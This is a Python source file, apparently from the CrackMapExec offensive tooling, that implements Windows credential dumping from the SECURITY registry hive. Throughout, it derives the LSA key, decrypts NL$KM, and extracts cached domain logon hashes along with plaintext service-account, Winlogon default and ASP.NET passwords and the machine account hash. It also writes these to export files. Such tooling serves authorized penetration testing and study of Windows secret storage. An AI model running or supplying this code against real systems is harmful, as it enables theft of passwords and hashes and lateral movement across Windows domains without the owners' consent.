from cme.credentials.offlineregistry import OfflineRegistry
from cme.credentials.cryptocommon import CryptoCommon
from cme.credentials.commonstructs import LSA_SECRET, LSA_SECRET_BLOB, NL_RECORD, LSA_SECRET_XP
from impacket import ntlm
from impacket.winregistry import hexdump
from Crypto.Cipher import AES, DES, ARC4
from Crypto.Hash import MD4
from binascii import hexlify
import logging
import ntpath
import hashlib
import codecs
from struct import unpack
import hmac as HMAC

class LSASecrets(OfflineRegistry):
    def __init__(self, securityFile, bootKey, logger, remoteOps = None, isRemote = False):
        OfflineRegistry.__init__(self,securityFile, isRemote)
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__LSAKey = ''
        self.__NKLMKey = ''
        self.__isRemote = isRemote
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__securityFile = securityFile
        self.__logger = logger
        self.__remoteOps = remoteOps
        self.__cachedItems = []
        self.__secretItems = []

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)
        for i in range(1000):
            sha.update(value)
        return sha.digest()

    def __decryptAES(self, key, value, iv='\x00'*16):
        plainText = ''
        if iv != '\x00'*16:
            aes256 = AES.new(key,AES.MODE_CBC, iv)

        for index in range(0, len(value), 16):
            if iv == '\x00'*16:
                aes256 = AES.new(key,AES.MODE_CBC, iv)
            cipherBuffer = value[index:index+16]
            # Pad buffer to 16 bytes
            if len(cipherBuffer) < 16:
                cipherBuffer += '\x00' * (16-len(cipherBuffer))
            plainText += aes256.decrypt(cipherBuffer)

        return plainText

    def __decryptSecret(self, key, value):
        # [MS-LSAD] Section 5.1.2
        plainText = ''

        encryptedSecretSize = unpack('<I', value[:4])[0]
        value = value[len(value)-encryptedSecretSize:]

        key0 = key
        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = self.__cryptoCommon.transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText)
            key0 = key0[7:]
            value = value[8:]
            # AdvanceKey
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)
        return secret['Secret']

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key,iv)
        rc4key = hmac_md5.digest()

        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)
        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            # ToDo: There could be more than one LSA Keys
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]

        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(value[60:76])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[0x10:0x20]

    def __getLSASecretKey(self):
        logging.debug('Decrypting LSA Key')
        # Let's try the key post XP
        value = self.getValue('\\Policy\\PolEKList\\default')
        if value is None:
            logging.debug('PolEKList not found, trying PolSecretEncryptionKey')
            # Second chance
            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
            self.__vistaStyle = False
            if value is None:
                # No way :(
                return None

        self.__decryptLSA(value[1])

    def __getNLKMSecret(self):
        logging.debug('Decrypting NL$KM')
        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
        if value is None:
            raise Exception("Couldn't get NL$KM value")
        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])

    def __pad(self, data):
        if (data & 0x3) > 0:
            return data + (data & 0x3)
        else:
            return data

    def dumpCachedHashes(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        self.__logger.success('Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)')

        # Let's first see if there are cached entries
        values = self.enumValues('\\Cache')
        if values is None:
            # No cache entries
            return
        try:
            # Remove unnecesary value
            values.remove('NL$Control')
        except:
            pass

        self.__getLSASecretKey()
        self.__getNLKMSecret()

        for value in values:
            logging.debug('Looking into %s' % value)
            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
            if record['CH'] != 16 * '\x00':
                if self.__vistaStyle is True:
                    plainText = self.__decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
                else:
                    plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['CH'])
                    pass
                encHash = plainText[:0x10]
                plainText = plainText[0x48:]
                userName = plainText[:record['UserLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['UserLength']):]
                domain = plainText[:record['DomainNameLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['DomainNameLength']):]
                domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                answer = "%s:%s:%s:%s:::" % (userName, hexlify(encHash), domainLong, domain)
                self.__cachedItems.append(answer)
                self.__logger.highlight(answer)

    def __printSecret(self, name, secretItem):
        # Based on [MS-LSAD] section 3.1.1.4

        # First off, let's discard NULL secrets.
        if len(secretItem) == 0:
            logging.debug('Discarding secret %s, NULL Data' % name)
            return

        # We might have secrets with zero
        if secretItem.startswith('\x00\x00'):
            logging.debug('Discarding secret %s, all zeros' % name)
            return

        upperName = name.upper()

        logging.info('%s ' % name)

        secret = ''

        if upperName.startswith('_SC_'):
            # Service name, a password might be there
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account the service
                # runs under
                if self.__isRemote is True:
                    account = self.__remoteOps.getServiceAccount(name[4:])
                    if account is None:
                        secret = '(Unknown User):'
                    else:
                        secret =  "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = '(Unknown User):'
                secret += strDecoded
        elif upperName.startswith('DEFAULTPASSWORD'):
            # defaults password for winlogon
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account this password is for
                if self.__isRemote is True:
                    account = self.__remoteOps.getDefaultLoginAccount()
                    if account is None:
                        secret = '(Unknown User):'
                    else:
                        secret = "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = '(Unknown User):'
                secret += strDecoded
        elif upperName.startswith('ASPNET_WP_PASSWORD'):
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'ASPNET: %s' % strDecoded
        elif upperName.startswith('$MACHINE.ACC'):
            # compute MD4 of the secret.. yes.. that is the nthash? :-o
            md4 = MD4.new()
            md4.update(secretItem)
            if self.__isRemote is True:
                machine, domain = self.__remoteOps.getMachineNameAndDomain()
                secret = "%s\\%s$:%s:%s:::" % (domain, machine, hexlify(ntlm.LMOWFv1('','')), hexlify(md4.digest()))
            else:
                secret = "$MACHINE.ACC: %s:%s" % (hexlify(ntlm.LMOWFv1('','')), hexlify(md4.digest()))

        if secret != '':
            self.__secretItems.append(secret)
            self.__logger.highlight(secret)
        else:
            # Default print, hexdump
            self.__secretItems.append('%s:%s' % (name, hexlify(secretItem)))
            self.__logger.highlight('{}:{}'.format(name, hexlify(secretItem)))
            #hexdump(secretItem)

    def dumpSecrets(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        self.__logger.success('Dumping LSA Secrets')

        # Let's first see if there are cached entries
        keys = self.enumKey('\\Policy\\Secrets')
        if keys is None:
            # No entries
            return
        try:
            # Remove unnecesary value
            keys.remove('NL$Control')
        except:
            pass

        if self.__LSAKey == '':
            self.__getLSASecretKey()

        for key in keys:
            logging.debug('Looking into %s' % key)
            value = self.getValue('\\Policy\\Secrets\\%s\\CurrVal\\default' % key)

            if value is not None:
                if self.__vistaStyle is True:
                    record = LSA_SECRET(value[1])
                    tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                    plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
                    record = LSA_SECRET_BLOB(plainText)
                    secret = record['Secret']
                else:
                    secret = self.__decryptSecret(self.__LSAKey, value[1])

                self.__printSecret(key, secret)

    def exportSecrets(self, fileName):
        if len(self.__secretItems) > 0:
            fd = codecs.open(fileName+'.secrets','w+', encoding='utf-8')
            for item in self.__secretItems:
                fd.write(item+'\n')
            fd.close()

    def exportCached(self, fileName):
        if len(self.__cachedItems) > 0:
            fd = codecs.open(fileName+'.cached','w+', encoding='utf-8')
            for item in self.__cachedItems:
                fd.write(item+'\n')
            fd.close()
